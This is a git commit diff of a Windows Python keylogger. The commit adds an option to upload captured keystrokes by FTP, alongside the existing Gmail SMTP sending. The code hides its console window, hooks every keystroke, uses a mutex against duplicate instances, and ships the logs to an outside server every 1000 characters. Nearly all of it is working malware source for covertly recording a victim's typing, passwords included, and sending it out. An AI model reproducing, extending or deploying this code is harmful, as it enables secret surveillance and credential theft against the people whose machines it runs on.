ed784104b79e6cf177d5449a3b7b3401fc7de4d4
xp4xbox <nicman1080@gmail.com>
2017-09-18 21:39:03 -0400

    Added option to send logs via FTP

--- Keylogger.py
+++ Keylogger.py
@@ -1,6 +1,7 @@
 import smtplib, time, os, threading, sys
 import win32console, win32gui, win32event, win32api, winerror
 from win32con import VK_CAPITAL
+from ftplib import FTP
 try:
     import pythoncom, pyHook
     from pyHook import GetKeyState, HookConstants
@@ -10,11 +11,19 @@ except ImportError:
 
 strEmailAc = "email@gmail.com"
 strEmailPass = "pass"
-blnBackRemove = "True"  # set this to True if you prefer the program removes the last key if the user types backspace
 
-blnStop = "False"
+blnFTP = "False"  # if using ftp set this to true and configure the options below
+strFtpServer = ""
+intFtpPort = 21
+strFtpUser = ""
+strFtpPass = ""
+strFtpRemotePath = "/"
 
-mutex = win32event.CreateMutex(None, 1, 'mutex_xp4key') # exit if there are multiple instances
+intCharPerSend = 1000  # set num of chars before send log
+blnBackRemove = "False"  # set this to True if you prefer the program removes the last key if the user types backspace
+
+# function to prevent multiple instances
+mutex = win32event.CreateMutex(None, 1, 'mutex_xp4key')
 if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
     mutex = None
     exit()
@@ -25,12 +34,12 @@ def hide(): # hide cmd window (optional if compiling as .exe)
     return True
 hide()
 
-# if persistence is installed opening any text file
-# will open the keylogger then use this code below
-# to open the txt file in notepad
+# open file in notepad if argument is given
 if len(sys.argv) == 2:
     strtxtFileCommand = os.environ["windir"]+"\\notepad.exe "+sys.argv[1]
     os.system(strtxtFileCommand)
+
+blnStop = "False"
 
 def OnKeyboardEvent(event):
     global strLogs
@@ -45,30 +54,58 @@ def OnKeyboardEvent(event):
                 strDateTime = "Keylogger Stopped At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S")
             else:
                 strDateTime = "Keylogger Started At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S")
-            strMessage = strDateTime + "\n\n" + strLogs
-            strMessage = "Subject: {}\n\n{}".format("New Keylogger Logs", strMessage)
+                strMessage = strDateTime + "\n\n" + strLogs
+                strMessage = "Subject: {}\n\n{}".format("New Keylogger Logs", strMessage)
 
-            SmtpServer = smtplib.SMTP_SSL("smtp.gmail.com", 465)
-            SmtpServer.ehlo()   # identifies you to the smtp server
-            SmtpServer.login(strEmailAc, strEmailPass)
-            SmtpServer.sendmail(strEmailAc, strEmailAc, strMessage)
+                SmtpServer = smtplib.SMTP_SSL("smtp.gmail.com", 465)
+                SmtpServer.ehlo()   # identifies you to the smtp server
+                SmtpServer.login(strEmailAc, strEmailPass)
+                SmtpServer.sendmail(strEmailAc, strEmailAc, strMessage)
         except:
-            # if for some reason, the email cannot send, exit program including threads.
+            os._exit(1)  # if for some reason, the email cannot send, exit program including threads.
+
+    def SendMessagesFTP(strLogs, strFtpServer, intFtpPort, strFtpUser, strFtpPass, strFtpRemotePath, blnStop):
+        try:
+            ftp = FTP(); ftp.connect(strFtpServer, 21)
+            ftp.login(strFtpUser, strFtpPass); ftp.cwd(strFtpRemotePath)
+            # connect to ftp server
+
+            TMP = os.environ["TEMP"]
+            objLogFile = open(TMP + "/keylog.txt", 'w')
+            if blnStop == "True":
+                objLogFile.write("\n\n""Keylogger Stopped At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S")+"\n\n")
+            else:
+                objLogFile.write("\n\n""Keylogger Started At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S") + "\n\n")
+            objLogFile.write(strLogs); objLogFile.close()
+            # create log file
+
+            arFileList  = ftp.nlst()
+            if "keylog.txt" in arFileList:
+                objLogFile = open(TMP + "/keylog.txt", 'rb'); ftp.storbinary("APPE keylog.txt", objLogFile)
+            else:
+                objLogFile = open(TMP + "/keylog.txt", 'rb'); ftp.storbinary("STOR keylog.txt", objLogFile)
+            objLogFile.close()
+            # send log file
+        except:
             os._exit(1)
 
     if GetKeyState(HookConstants.VKeyToID("VK_CONTROL")) and GetKeyState(HookConstants.VKeyToID("VK_RSHIFT")) and HookConstants.IDToName(event.KeyID) == "H":
         # CTRL-RIGHT_SHIFT-H to stop the program
         # create a new thread so that there is no delay while sending email
-        SendMailThread = threading.Thread(target=SendMessages, args=(strLogs, strEmailAc, strEmailPass, "True"))
-        SendMailThread.start()
+        if blnFTP == "True":
+            SendFTPThread = threading.Thread(target=SendMessagesFTP, args=(strLogs, strFtpServer, intFtpPort, strFtpUser, strFtpPass, strFtpRemotePath, "True"))
+            SendFTPThread.start()
+        else:
+            SendMailThread = threading.Thread(target=SendMessages, args=(strLogs, strEmailAc, strEmailPass, "True"))
+            SendMailThread.start()
         exit()
 
-    if event.Key == "Return": # if the user types "enter" move to a new line
+    if event.Key == "Return":  # if the user types "enter" move to a new line
         strLogs = strLogs + "\n"
     elif event.Key == "Space":
         strLogs = strLogs + " "
     elif event.Key == "Back":
-        if blnBackRemove == "True": # if the file is configured to delete the last key if backspaced is pressed
+        if blnBackRemove == "True":
             if not strLogs == "":
                 strLogs = strLogs[0:len(strLogs) - 1]
         else:
@@ -77,14 +114,14 @@ def OnKeyboardEvent(event):
         strLogs = strLogs + " [Delete] "
     elif event.Key == "Tab":
         strLogs = strLogs + "\t"
-    elif event.Key == "Oem_5": # if backslash is pressed
+    elif event.Key == "Oem_5":
         strLogs = strLogs + "\\"
     # check to see if key is shift + backslash
     elif event.Key == "Oem_5" and (GetKeyState(HookConstants.VKeyToID("VK_RSHIFT")) or GetKeyState(HookConstants.VKeyToID("VK_LSHIFT"))):
         strLogs = strLogs + "|"
     elif event.Key == "Capital" or event.Key == "Rshift" or event.Key == "Lshift":
         pass
-    elif len(event.Key) > 1: # check to see if key is a special key
+    elif len(event.Key) > 1:  # check to see if key is a special key
         strLogs = strLogs + " [" + event.Key + "] "
     else:
         # check to see if caps lock is on or the shift key is held down
@@ -94,13 +131,14 @@ def OnKeyboardEvent(event):
             # since event.Key outputs all keys as uppercase, lower normal ones
             strLogs = strLogs + ((event.Key).lower())
 
-    # set amount of characters until log will be sent out. Currently 1000 characters, roughly 160-200 words
-    if len(strLogs) >= 1000:
-        # create a new thread so that there is no delay while sending email
-        SendMailThread = threading.Thread(target=SendMessages, args=(strLogs, strEmailAc, strEmailPass, blnStop))
-        SendMailThread.start()
+    if len(strLogs) >= intCharPerSend:  # send message
+        if blnFTP == "True":
+            SendFTPThread = threading.Thread(target=SendMessagesFTP, args=(strLogs, strFtpServer, intFtpPort, strFtpUser, strFtpPass, strFtpRemotePath, blnStop))
+            SendFTPThread.start()
+        else:
+            SendMailThread = threading.Thread(target=SendMessages, args=(strLogs, strEmailAc, strEmailPass, blnStop))
+            SendMailThread.start()
         strLogs = ""
-    print(strLogs)
     return True
 
 hooks_manager = pyHook.HookManager()
